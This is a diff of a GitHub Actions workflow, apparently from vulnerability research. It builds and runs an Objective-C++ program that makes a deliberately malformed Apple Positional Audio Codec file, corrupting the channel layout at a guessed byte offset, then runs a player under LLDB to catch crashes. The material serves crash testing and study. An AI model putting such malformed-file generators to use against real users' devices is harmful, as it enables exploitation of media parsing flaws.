@@ -19,76 +19,100 @@ jobs:
       - name: Navigate to working directory
         run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # Updated: Patch encodeme.mm to generate a malicious APAC file.
-      - name: Patch encodeme.mm to generate malicious APAC file
+      # Updated: This script now generates a valid WAV, converts it to APAC, then corrupts it.
+      - name: Patch encodeme.mm to generate and corrupt APAC file
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm to generate a file with a malicious APAC channel layout..."
+          echo "Patching encodeme.mm to generate a WAV, convert to APAC, and then corrupt..."
           cat > encodeme.mm << 'EOF'
           #import <Foundation/Foundation.h>
           #import <AudioToolbox/AudioToolbox.h>
+          #include <stdlib.h> // for system()
           #include <string.h>
-          #include <stdlib.h>
+
+          // Helper function to write a simple, valid WAV file
+          bool createValidWAV(const char* path) {
+              AudioStreamBasicDescription asbd = {0};
+              asbd.mSampleRate = 48000;
+              asbd.mFormatID = kAudioFormatLinearPCM;
+              asbd.mFormatFlags = kAudioFormatFlagIsSignedInteger | kAudioFormatFlagIsPacked;
+              asbd.mBitsPerChannel = 16;
+              asbd.mChannelsPerFrame = 4; // 4 channels for ambisonics
+              asbd.mBytesPerFrame = asbd.mChannelsPerFrame * (asbd.mBitsPerChannel / 8);
+              asbd.mFramesPerPacket = 1;
+              asbd.mBytesPerPacket = asbd.mFramesPerPacket * asbd.mBytesPerFrame;
+
+              CFURLRef url = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, (CFStringRef)[NSString stringWithUTF8String:path], kCFURLPOSIXPathStyle, false);
+              AudioFileID audioFile;
+              OSStatus status = AudioFileCreateWithURL(url, kAudioFileWAVEType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
+              CFRelease(url);
+              if (status != noErr) {
+                  fprintf(stderr, "Failed to create WAV file.\n");
+                  return false;
+              }
+
+              // Write a small amount of silent audio data
+              UInt32 numPackets = 1024;
+              char dummy_data[numPackets * asbd.mBytesPerPacket];
+              memset(dummy_data, 0, sizeof(dummy_data));
+              status = AudioFileWritePackets(audioFile, false, sizeof(dummy_data), NULL, 0, &numPackets, dummy_data);
+              
+              AudioFileClose(audioFile);
+              return status == noErr;
+          }
 
           int main(int argc, const char * argv[]) {
               @autoreleasepool {
                   time_t startTime = time(NULL);
                   fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));
 
-                  const char* fileName = "output_apac_poc.m4a";
-                  CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault,
-                                                                   (CFStringRef)[NSString stringWithUTF8String:fileName],
-                                                                   kCFURLPOSIXPathStyle, false);
+                  const char* wavName = "base.wav";
+                  const char* apacBaseName = "output_apac_base.m4a";
+                  const char* pocName = "output_apac_poc.m4a";
 
-                  // Define the audio format for APAC (Apple Positional Audio Codec)
-                  AudioStreamBasicDescription asbd = {0};
-                  asbd.mSampleRate = 48000;
-                  asbd.mFormatID = 'apac'; // Use the specific APAC format ID
-                  asbd.mFramesPerPacket = 1024;
-                  asbd.mChannelsPerFrame = 4; // Lie: Claim there are only 4 channels here.
+                  // Step 1: Create a valid WAV file as a source.
+                  if (!createValidWAV(wavName)) {
+                      fprintf(stderr, "WAV creation failed.\n");
+                      return 1;
+                  }
+                  fprintf(stderr, "Successfully created source WAV file.\n");
 
-                  AudioFileID audioFile;
-                  OSStatus status = AudioFileCreateWithURL(fileURL, kAudioFileM4AType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
-                  if (status != noErr) {
-                      fprintf(stderr, "AudioFileCreateWithURL failed: %d\n", status);
+                  // Step 2: Use afconvert to create a valid baseline APAC file.
+                  NSString* command = [NSString stringWithFormat:@"afconvert -o %@ -d apac -f mp4f %@", 
+                                       [NSString stringWithUTF8String:apacBaseName], 
+                                       [NSString stringWithUTF8String:wavName]];
+                  fprintf(stderr, "Running command: %s\n", [command UTF8String]);
+                  int ret = system([command UTF8String]);
+                  if (ret != 0) {
+                      fprintf(stderr, "afconvert failed.\n");
+                      return 1;
+                  }
+                  fprintf(stderr, "Successfully converted WAV to a valid APAC M4A.\n");
+
+                  // Step 3: Copy the valid APAC file to our target PoC file name.
+                  NSError *error = nil;
+                  [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithUTF8String:apacBaseName] 
+                                                          toPath:[NSString stringWithUTF8String:pocName] error:&error];
+                  if (error) {
+                      fprintf(stderr, "Failed to copy file for corruption.\n");
                       return 1;
                   }
 
-                  // PoC: Create a malicious AudioChannelLayout with a mismatched number of descriptions.
-                  // This is the core of the vulnerability.
-                  size_t layoutSize = sizeof(AudioChannelLayout) + 255 * sizeof(AudioChannelDescription);
-                  AudioChannelLayout *maliciousLayout = (AudioChannelLayout*)calloc(1, layoutSize);
-                  maliciousLayout->mChannelLayoutTag = kAudioChannelLayoutTag_UseChannelDescriptions;
-                  maliciousLayout->mNumberChannelDescriptions = 255; // The real lie: Claim there are 255 channels here.
-                  
-                  // Populate with dummy descriptions
-                  for (int i = 0; i < 255; i++) {
-                      maliciousLayout->mChannelDescriptions[i].mChannelLabel = kAudioChannelLabel_Mono;
-                  }
-
-                  // Set the malicious channel layout on the file. This is where the vulnerability is seeded.
-                  status = AudioFileSetProperty(audioFile, kAudioFilePropertyChannelLayout, layoutSize, maliciousLayout);
-                  if (status != noErr) {
-                      fprintf(stderr, "AudioFileSetProperty (ChannelLayout) failed: %d\n", status);
-                      AudioFileClose(audioFile);
-                      free(maliciousLayout);
+                  // Step 4: Manually corrupt the channel layout in the new file.
+                  FILE *file = fopen(pocName, "r+b");
+                  if (!file) {
+                      fprintf(stderr, "Failed to re-open the M4A file for corruption.\n");
                       return 1;
                   }
                   
-                  free(maliciousLayout);
+                  // The offset for the channel layout tag can be fragile. We'll estimate it.
+                  // This is where the vulnerability is seeded.
+                  fseek(file, 0x110, SEEK_SET); // Estimate for stsd atom's layout tag
+                  unsigned char malicious_data[4] = {0xFF, 0xFF, 0xFF, 0xFF}; // Invalid layout tag
+                  fwrite(malicious_data, 1, sizeof(malicious_data), file);
+                  fclose(file);
 
-                  // Write a small amount of dummy packet data to make the file valid enough to pass initial checks.
-                  UInt32 numPacketsToWrite = 1;
-                  char dummy_data[128] = {0};
-                  status = AudioFileWritePackets(audioFile, false, sizeof(dummy_data), NULL, 0, &numPacketsToWrite, dummy_data);
-                   if (status != noErr) {
-                      fprintf(stderr, "AudioFileWritePackets failed: %d\n", status);
-                  }
-
-                  AudioFileClose(audioFile);
-                  CFRelease(fileURL);
-
-                  fprintf(stderr, "PoC: Wrote an APAC file with a mismatched channel layout.\n");
+                  fprintf(stderr, "PoC: Manually corrupted the channel layout in the APAC file.\n");
                   time_t endTime = time(NULL);
                   fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
               }
@@ -110,40 +134,12 @@ jobs:
           clang++ -g -fobjc-arc -framework Foundation -framework AudioToolbox encodeme.mm -o encodeme_debug
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
 
-      # New: Debug the generator itself to see why the property is rejected.
-      - name: Debug APAC File Generation
-        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
-        run: |
-          GENERATOR_LOG_FILE="generator_debug_log.txt"
-          echo "--- Debugging APAC File Generation Process ---" > $GENERATOR_LOG_FILE
-          echo "Timestamp: $(date)" >> $GENERATOR_LOG_FILE
-
-          echo "Creating LLDB script to trace AudioFileSetProperty..." > $GENERATOR_LOG_FILE
-          cat > generator_debug_script.lldb << 'EOF'
-          # Set a breakpoint just before the call that is failing
-          breakpoint set --file encodeme.mm --line 53
-          run
-          # Now that we've hit the breakpoint, step into the function call
-          # to see where in the framework the validation is happening.
-          thread step-in
-          # Get a backtrace from inside the framework function.
-          bt
-          continue
-          quit
-          EOF
-          
-          echo "Launching encodeme_debug under LLDB to trace the failing API call..." >> $GENERATOR_LOG_FILE
-          lldb -s generator_debug_script.lldb -- ./encodeme_debug >> $GENERATOR_LOG_FILE 2>&1 || true
-
-          echo "✅ Generator debug log created. Displaying contents:"
-          cat $GENERATOR_LOG_FILE
-
-      # Run and Verify File Generation (will likely fail, but we capture the log above)
-      - name: Run and Verify File Generation
+      # This step now runs the full generate-convert-corrupt process.
+      - name: Generate and Corrupt APAC File
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
           ./encodeme_debug
-          echo "File 'output_apac_poc.m4a' generated."
+          echo "Malicious APAC file 'output_apac_poc.m4a' generated."
           ls -l output_apac_poc.m4a
           
       # Launch the player directly under LLDB to catch any startup crashes
@@ -169,14 +165,13 @@ jobs:
           echo "✅ Player debug log created. Displaying contents:"
           cat $PLAYER_LOG_FILE
 
-      # Upload all artifacts: the invalid M4A and both debug logs
+      # Upload all artifacts
       - name: Upload All Artifacts
         uses: actions/upload-artifact@v4
         with:
           name: audio-and-debug-artifacts
           path: |
             AppleTest/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
-            AppleTest/apple-positional-audio-codec-invalid-header-main/generator_debug_log.txt
             AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
           retention-days: 7
           if-no-files-found: error
